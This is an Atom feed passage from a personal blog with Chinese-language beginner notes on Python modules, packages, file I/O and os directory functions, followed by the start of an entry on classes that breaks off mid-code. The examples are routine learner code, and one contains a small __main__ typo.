<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://sinky.top/atom.xml" rel="self"/>
  
  <link href="https://sinky.top/"/>
  <updated>2022-09-23T12:18:37.998Z</updated>
  <id>https://sinky.top/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python学习9</title>
    <link href="https://sinky.top/2022/09/23/python%E5%AD%A6%E4%B9%A09/"/>
    <id>https://sinky.top/2022/09/23/python%E5%AD%A6%E4%B9%A09/</id>
    <published>2022-09-23T04:08:22.625Z</published>
    <updated>2022-09-23T12:18:37.998Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><ul><li>一个模块中可以包含N多个函数</li><li>在python中一个扩展名为.py的文件就是一个模块</li><li>好处：<ul><li>方便其他程序和脚本的导入并使用</li><li>避免函数名和变量名冲突</li><li>提高代码的可维护性和可重用性</li></ul></li></ul><h2 id="自定义模块"><a href="#自定义模块" class="headerlink" title="自定义模块"></a>自定义模块</h2><ol><li>创建模块：新建一个.py文件，尽量不要与python自带的标准名呈相同</li><li>导入模块：<ol><li>所有： <code>import 模块名称 [as 别名]</code></li><li>指定： <code>from 模块名称 import 函数/变量/类</code></li></ol></li></ol><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import math#关于数学运算<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(math)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(math)</span></span>)#&lt;class <span class="hljs-string">'module'</span>&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math)</span></span>#&lt;module <span class="hljs-string">'math'</span> (built-<span class="hljs-keyword">in</span>)&gt;<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.pi)</span></span>#<span class="hljs-number">3.141592653589793</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(dir(math)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.pow(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)</span></span>)#<span class="hljs-number">8.0</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.ceil(<span class="hljs-number">9.00001</span>)</span></span>)#<span class="hljs-number">10</span> ceil 天花板<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(math.floor(<span class="hljs-number">9.99999</span>)</span></span>)#<span class="hljs-number">9</span> floor 地板<br></code></pre></td></tr></tbody></table></figure><p>或：</p><pre><code class="hljs">from math import piimport mathprint(pi)#3.141592653589793print(pow(2,3))#8 定义位置在builtins.pyprint(math.pow(2,3))# 8.0  定义位置在math.py</code></pre><p>eg:</p><p>(1) 创建calc.py 作为自定义模块</p><pre><code class="hljs">def add(a,b):    return a+bdef div(a,b):    return a/b</code></pre><p>(2)创建demo3.py调用自定义模块calc.py</p><pre><code class="hljs">import calcprint(calc.add(10,20))print(calc.div(10,4))</code></pre><p>或 </p><pre><code class="hljs">from calc import addprint(add(10,20))</code></pre><h2 id="以主程序形式运行"><a href="#以主程序形式运行" class="headerlink" title="以主程序形式运行"></a>以主程序形式运行</h2><p>在每个模块的定义中都包括一个记录模块名称的变量__name__，程序可以检查该变量以确定它在哪个模块中执行，若一个模块不是被导入到其他程序中执行，那么它可能在解释器的顶级模块中执行，顶级模块的__name__变量的值为__main__</p><pre><code class="hljs">if __name__=='__main__':        pass</code></pre><p>新建calc1.py中：</p><pre><code class="hljs">def add(a,b):    return a+bif __name__=='__name__':    print(add(10,20))</code></pre><p>在demo4.py中：</p><pre><code class="hljs">import calc1print(calc1.add(100,200))</code></pre><blockquote><p>只有运行calc1.py时，才会执行add(10,20);当demo4.py调用calc1时，不执行if语句中的内容</p></blockquote><h2 id="Python中的包"><a href="#Python中的包" class="headerlink" title="Python中的包"></a>Python中的包</h2><ol><li>包是一个分层次的目录结构，它将一组功能相近的模块组织在一个目录下</li><li>作用：代码规范；避免模块名称冲突</li><li>包与目录的区别：<ol><li>包含__init__.py文件的目录称作包</li><li>目录中通常不包含__init__.py文件</li></ol></li><li>包的导入：<code>import 包名.模块名</code></li></ol><p>包：New-&gt;Python package  默认有__init__.py</p><p>目录：New-&gt;Directory </p><p>eg:</p><p>新建包pageage，在其下新建模块moduleA.py和moduleB.py</p><pre><code class="hljs">#moduleA.pya=10#moduleB.pyb=100</code></pre><p>新建demo5.py用于导入包：</p><pre><code class="hljs">import pageage.moduleA as ma #ma为别名 #print(pageage.moduleA.a)print(ma.a)</code></pre><p>导入带有包的模块时：</p><ol><li><p>使用import方式，只能跟包名或模块名</p><p> import pageage<br> import calc</p></li><li><p>使用from…import可以导入包，模块，函数，变量</p><p> from pageage import moduleA<br> from pageage.moduleA import a</p></li></ol><h2 id="常用内置模块"><a href="#常用内置模块" class="headerlink" title="常用内置模块"></a>常用内置模块</h2><ul><li>sys 与python解释器及其环境操作相关的标准库</li><li>time 提供与时间相关的各种函数的标准库</li><li>os 访问操作系统服务功能的标准库</li><li>calendar 日期相关标准库</li><li>urllib 读取来自我网上（服务器）的数据标准库</li><li>json 用于使用JSON序列化和反序列化对象</li><li>re 用于在字符串中执行正则表达式匹配和替换</li><li>math 算术相关标准库</li><li>decimal 精确控制运算精度，有效数位和四舍五入的十进制运算</li><li>logging 日志信息</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import sys<br><span class="hljs-built_in">print</span>(sys.getsizeof(24))# 获得所占内存大小 28<br><span class="hljs-built_in">print</span>(sys.getsizeof(45))#28<br><span class="hljs-built_in">print</span>(sys.getsizeof(<span class="hljs-literal">True</span>))#28<br><span class="hljs-built_in">print</span>(sys.getsizeof(<span class="hljs-literal">False</span>))#24<br>import time<br><span class="hljs-built_in">print</span>(time.time())#1663919662.3144715<br><span class="hljs-built_in">print</span>(time.localtime(time.time()))#time.struct_time(<span class="hljs-attribute">tm_year</span>=2022, <span class="hljs-attribute">tm_mon</span>=9, <span class="hljs-attribute">tm_mday</span>=23, <span class="hljs-attribute">tm_hour</span>=15, <span class="hljs-attribute">tm_min</span>=54, <span class="hljs-attribute">tm_sec</span>=53, <span class="hljs-attribute">tm_wday</span>=4, <span class="hljs-attribute">tm_yday</span>=266, <span class="hljs-attribute">tm_isdst</span>=0)<br>import urllib.request<br><span class="hljs-built_in">print</span>(urllib.request.urlopen(<span class="hljs-string">'http://www.baidu.com'</span>).read())<br>import math<br><span class="hljs-built_in">print</span>(math.pi)#3.141592653589793<br></code></pre></td></tr></tbody></table></figure><h2 id="第三方模块的安装及使用"><a href="#第三方模块的安装及使用" class="headerlink" title="第三方模块的安装及使用"></a>第三方模块的安装及使用</h2><p>安装：<code>pip install 模块名</code></p><p>使用：<code>import 模块名</code></p><p>eg: <code>pip install schedule</code></p><p>ps：因为我电脑中是python2 3共存，所以先去安装了一下pip</p><p>pip下载地址：</p><p><a href="https://pypi.org/project/pip/#files" title="pip下载地址">https://pypi.org/project/pip/#files</a></p><p>安装：<code>python3.exe -m pip install pip22全名</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> schedule<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">job</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'哈哈----'</span>)<br> <span class="hljs-comment">#每三秒执行一次job()</span><br>schedule.every(<span class="hljs-number">3</span>).seconds.do(job)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    schedule.run_pending()<span class="hljs-comment">#启动</span><br>    time.sleep(<span class="hljs-number">1</span>)<span class="hljs-comment">#给予缓冲时间，休眠一秒</span><br></code></pre></td></tr></tbody></table></figure><h1 id="编码格式"><a href="#编码格式" class="headerlink" title="编码格式"></a>编码格式</h1><p>python解释器 ——Unicode(内存)</p><p>.py文件 在磁盘上 ——UTF-8(外存)</p><p><img src="/unicode.png"></p><p>eg: <code>#encoding=GBK</code></p><h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><ol><li><p>文件读写俗称‘IO操作’</p></li><li><p>内置函数open()创建文件对象</p><p> file=open(filename [,mode,encoding])</p></li></ol><p>file: 被创建的文件对象</p><p>mode: 打开模式默认为只读</p><p>encoding: 默认文本文件中字符的编写格式为GBK</p><p>eg:</p><ol><li>在磁盘上创建a.txt，内容：’中国’</li><li>用pycharm打开，转GBK</li><li>新建.py文件</li></ol><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">'a.txt'</span>,<span class="hljs-string">'r'</span>,encoding=<span class="hljs-string">'UTF-8'</span>)<span class="hljs-comment">#r 只读</span><br>print(<span class="hljs-built_in">file</span>.readlines())<span class="hljs-comment">#['中国\n']</span><br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#关闭系统释放资源</span><br></code></pre></td></tr></tbody></table></figure><p>ps: 转不了GBK,只好在读取的时候就设定编码格式了</p><h2 id="常用文件打开模式"><a href="#常用文件打开模式" class="headerlink" title="常用文件打开模式"></a>常用文件打开模式</h2><p>按文件中数据的组织形式分类：</p><ul><li>文本文件：存储普通’字符’文本，默认unicode，可用txt打开</li><li>二进制文件：以’字节’存储，必须用专用软件打开</li></ul><p>打开模式：</p><ul><li>r 只读，文件指针在文件开头</li><li>w 只写，文件不存在则创建，存在则覆盖原内容，文件指针在文件开头</li><li>a 追加，文本不在则创建，存在则在原内容后追加内容，文件指针在文件末尾</li><li>b 以二进制方式打开文件，不可单独使用</li><li><code>+</code> 读写，不可单独使用</li></ul><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=<span class="hljs-built_in">open</span>(<span class="hljs-string">'b.txt'</span>,<span class="hljs-string">'w'</span>)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(<span class="hljs-string">'Python'</span>)<br><span class="hljs-built_in">file</span>.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></tbody></table></figure><p>创建了b.txt，内容为：Python</p><p>eg:</p><p>在根目录下添加图片：logo.png</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">src_file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'logo.png'</span>,<span class="hljs-string">'rb'</span>)<span class="hljs-comment">#打开logo.png,只读</span><br>target_file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'copylogo.png'</span>,<span class="hljs-string">'wb'</span>)<span class="hljs-comment">#创建copylogo.png</span><br>target_file.<span class="hljs-built_in">write</span>(src_file.<span class="hljs-built_in">read</span>())<span class="hljs-comment">#读取的logo.png内容写到copylogo.png中</span><br>target_file.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#释放资源</span><br>src_file.<span class="hljs-built_in">close</span>()<span class="hljs-comment">#释放资源</span><br></code></pre></td></tr></tbody></table></figure><h2 id="文件对象的常用方法"><a href="#文件对象的常用方法" class="headerlink" title="文件对象的常用方法"></a>文件对象的常用方法</h2><ul><li>read([size]) 从文件中读size个字节或字符内容，返回略。若无size值则读取全部</li><li>readline() 读一行</li><li>readlines() 读每一行，单独成对象放入列表中</li><li>write(str) 将str写入文件</li><li>writelines(s_list) 将列表s_list写入文件，不加换行符</li><li>seek(offest[where])</li><li>tell() 返回文件指针当前位置</li><li>flush() 缓冲区内容写入文件，但不关闭文件</li><li>close() 缓冲股权内容写入文件，同事关闭文件，释放资源</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'a.txt'</span>,<span class="hljs-string">'r'</span>,encoding=<span class="hljs-string">'utf-8'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read()</span></span>)#中国\n美丽<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read(<span class="hljs-number">2</span>)</span></span>)#中国<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.readline()</span></span>)#中国<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.readlines()</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'中国\n'</span>, <span class="hljs-string">'美丽'</span>]</span><br> <span class="hljs-selector-id">#seek</span> tell writelines<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'c.txt'</span>,<span class="hljs-string">'a'</span>)<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">'hello'</span>)<br>lst=<span class="hljs-selector-attr">[<span class="hljs-string">'java'</span>,<span class="hljs-string">'go'</span>,<span class="hljs-string">'python'</span>]</span><br>file<span class="hljs-selector-class">.writelines</span>(lst)<span class="hljs-selector-id">#hellohellojavagopython</span><br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'c.txt'</span>,<span class="hljs-string">'r'</span>)<br>file<span class="hljs-selector-class">.seek</span>(<span class="hljs-number">2</span>)#从第二个字节开始读<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.read()</span></span>)<span class="hljs-selector-id">#llohellojavagopython</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(file.tell()</span></span>)#<span class="hljs-number">22</span><br> <span class="hljs-selector-id">#flush</span>()<br>file=<span class="hljs-built_in">open</span>(<span class="hljs-string">'d.txt'</span>,<span class="hljs-string">'a'</span>)<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">'hello'</span>)<br>file<span class="hljs-selector-class">.flush</span>()<br>file<span class="hljs-selector-class">.write</span>(<span class="hljs-string">' world'</span>)<span class="hljs-selector-id">#hello</span> world<br>file<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></tbody></table></figure><h2 id="with语句（上下文管理器）"><a href="#with语句（上下文管理器）" class="headerlink" title="with语句（上下文管理器）"></a>with语句（上下文管理器）</h2><p>自动管理上下文资源，确保文件正确关闭释放资源</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'b.txt'</span>,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    print(<span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>())<span class="hljs-comment">#Python</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'logo.png'</span>,<span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> src_file:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'copy2logo.png'</span>,<span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> target_file:<br>        target_file.<span class="hljs-built_in">write</span>(src_file.<span class="hljs-built_in">read</span>())<br></code></pre></td></tr></tbody></table></figure><h1 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h1><p>os模块与操作系统有关</p><p>os模块与os.path模块对目录或文件操作</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">import</span> os<br>os.<span class="hljs-keyword">system</span>(<span class="hljs-string">'notepad.exe'</span>)#打开记事本<br>os.<span class="hljs-keyword">system</span>((<span class="hljs-string">'calc.exe'</span>))#打开计算器<br> #直接调用可执行文件<br>os.startfile(<span class="hljs-string">'..\\Tencent\\QQ\\Bin\\QQ.exe'</span>)# 打开QQ<br></code></pre></td></tr></tbody></table></figure><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><ul><li>getcwd() 返回当前工作目录</li><li>listdir(path) 返回指定路径下的文件和目录信息</li><li>mkdir(path [,mode]) 创建目录</li><li>makedirs(path/path1/……） 创建多级目录</li><li>rmdir() 删除目录</li><li>removedirs() 删除多级目录</li><li>chdir() 将path设置为当前工作目录</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import os<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(os.getcwd()</span></span>)<br>lst=os<span class="hljs-selector-class">.listdir</span>(<span class="hljs-string">'../python学习下-面向对象'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(lst)</span></span><br>os<span class="hljs-selector-class">.mkdir</span>(<span class="hljs-string">'newdir'</span>)<br>os<span class="hljs-selector-class">.makedirs</span>(<span class="hljs-string">'A/B/C'</span>)<br> <span class="hljs-selector-id">#os</span><span class="hljs-selector-class">.rmdir</span>(<span class="hljs-string">'newdir'</span>)<br> <span class="hljs-selector-id">#os</span><span class="hljs-selector-class">.removedirs</span>(<span class="hljs-string">'A/B/C'</span>)<br>os<span class="hljs-selector-class">.chdir</span>(<span class="hljs-string">'..\\python学习下-面向对象'</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(os.getcwd()</span></span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="os-path模块相关函数"><a href="#os-path模块相关函数" class="headerlink" title="os.path模块相关函数"></a>os.path模块相关函数</h2><ul><li>abspath(path) 获取绝对路径</li><li>exists() 判断目录是否存在，在True,不在False</li><li>join(path,name) 将目录与目录或文件名拼接起来</li><li>splitext() 分离文件名和扩展名</li><li>basename() 从一个目录中提取文件名</li><li>dirname(path) 从一个路径中提取文件路径，不包括文件名</li><li>isdir(path) 用于判断是否为路径</li></ul><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.abspath(<span class="hljs-string">'demo14.py'</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-string">'demo2.py'</span>)) # True<br><span class="hljs-built_in">print</span>((<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-string">'D:\\'</span>,<span class="hljs-string">'demo14.py'</span>))) #D:\demo14.py<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.split(<span class="hljs-string">'demo14.py'</span>)) #(<span class="hljs-string">''</span>, <span class="hljs-string">'demo14.py'</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.splitext(<span class="hljs-string">'demo14.py'</span>)) #(<span class="hljs-string">'demo14'</span>, <span class="hljs-string">'.py'</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.basename(<span class="hljs-string">'D:\demo14.py'</span>)) #demo14.py<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.dirname(<span class="hljs-string">'D:\demo14.py'</span>)) #D:\<br></code></pre></td></tr></tbody></table></figure><p>eg: 列出指定目录下的所有py文件</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span><br><span class="hljs-built_in">path</span>=<span class="hljs-built_in">os</span>.getcwd()<br>lst=<span class="hljs-built_in">os</span>.listdir(<span class="hljs-built_in">path</span>)<br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-keyword">if</span> filename.endswith(<span class="hljs-string">'.py'</span>):<br>        <span class="hljs-built_in">print</span>(filename)<br></code></pre></td></tr></tbody></table></figure><p>eg: 目录如下：</p><ul><li>python:<ul><li>demo16.py</li><li>newdir:<ul><li>1.py</li><li>2.py</li><li>sub:<ul><li>sub1.py</li></ul></li></ul></li></ul></li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import os<br><span class="hljs-attribute">path</span>=os.getcwd()<br><span class="hljs-attribute">lst_files</span>=os.walk(path)<br><span class="hljs-keyword">for</span> dirpath,dirname,filename <span class="hljs-keyword">in</span> lst_files:<br>    <span class="hljs-built_in">print</span>(dirpath)<br>    <span class="hljs-built_in">print</span>(dirname)<br>    <span class="hljs-built_in">print</span>(filename)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'-------------'</span>)<br>    <span class="hljs-keyword">for</span> dir <span class="hljs-keyword">in</span> dirname:<br>        <span class="hljs-built_in">print</span>(os.path.join(dirpath,dir))<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> filename:<br>        <span class="hljs-built_in">print</span>(os.path.join(dirpath,file))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'------------------'</span>)<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;模块&quot;&gt;&lt;a href=&quot;#模块&quot; class=&quot;headerlink&quot; title=&quot;模块&quot;&gt;&lt;/a&gt;模块&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;一个模块中可以包含N多个函数&lt;/li&gt;
&lt;li&gt;在python中一个扩展名为.py的文件就是一个模块&lt;/li&gt;
&lt;li&gt;好处：&lt;</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习8</title>
    <link href="https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A08/"/>
    <id>https://sinky.top/2022/09/19/python%E5%AD%A6%E4%B9%A08/</id>
    <published>2022-09-19T11:54:03.008Z</published>
    <updated>2022-09-21T13:44:42.826Z</updated>
    
    <content type="html"><![CDATA[<p>面向对象篇啦！！！！</p><h1 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h1><p>类：多个类似事物组成的群体；数据类型</p><p>对象：100，99是int类下包含的相似不相同个例，称为实例或对象（一切皆对象）</p><h2 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h2><figure class="highlight angelscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">class</span> <span class="hljs-symbol">Student:</span><br><span class="hljs-symbol">    <span class="hljs-symbol">pass</span></span><br></code></pre></td></tr></tbody></table></figure><p>类的组成：类属性、实例方法、静态方法、类方法</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span><span class="hljs-symbol">:</span><span class="hljs-comment">#Student为类名，由一个或多个单词组成，每个单词首字母大写，其余小写</span><br>    native_pace=<span class="hljs-string">'内蒙'</span><span class="hljs-comment">#直接写在类中的变量成为类属性</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,name,age</span>)<span class="hljs-symbol">:</span><span class="hljs-comment">#初始化</span><br>        <span class="hljs-variable language_">self</span>.name=name<span class="hljs-comment">#self.name成为实体属性，进行了赋值操作，将局部变量name值赋给实体属性</span><br>        <span class="hljs-variable language_">self</span>.age=age<br>    <span class="hljs-comment">#实例方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">eat</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-string">'学生吃饭函数'</span>)<br>    <span class="hljs-comment">#静态方法</span><br>    <span class="hljs-variable">@staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">method</span>():<br>        print(<span class="hljs-string">'使用staticmethod进行修饰，为静态方法'</span>)<br>    <span class="hljs-comment">#类方法</span><br>    <span class="hljs-variable">@classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cm</span>(<span class="hljs-params">cls</span>):<br>        print(<span class="hljs-string">'使用classmethod进行修饰，为类方法'</span>)<br> <span class="hljs-comment">#在类之外定义的称为函数，在之内的称为方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">drink</span>():<br>    print(<span class="hljs-string">'类之外定义的，是函数'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><p>又称类的实例化：实例名=类名()</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">stu=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu.name)</span></span>#实例属性<span class="hljs-selector-id">#Jack</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu.age)</span></span>#<span class="hljs-number">20</span><br>stu<span class="hljs-selector-class">.eat</span>()#学生吃饭函数<br>Student<span class="hljs-selector-class">.eat</span>(stu)#学生吃饭函数,二者功能相同<br></code></pre></td></tr></tbody></table></figure><h2 id="类属性，类方法，静态方法"><a href="#类属性，类方法，静态方法" class="headerlink" title="类属性，类方法，静态方法"></a>类属性，类方法，静态方法</h2><p>1.类属性：类中方法外的变量为类属性，被该类所有对象共享</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Student.native_pace)</span></span>#内蒙<br>stu1=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Jack'</span>,<span class="hljs-number">20</span>)<br>stu2=<span class="hljs-built_in">Student</span>(<span class="hljs-string">'Rose'</span>,<span class="hljs-number">30</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu1.native_pace)</span></span>#内蒙<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(stu2.native_pace)</span></span>#内蒙<br>Student.native_pace=<span class="hljs-string">'天津'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span 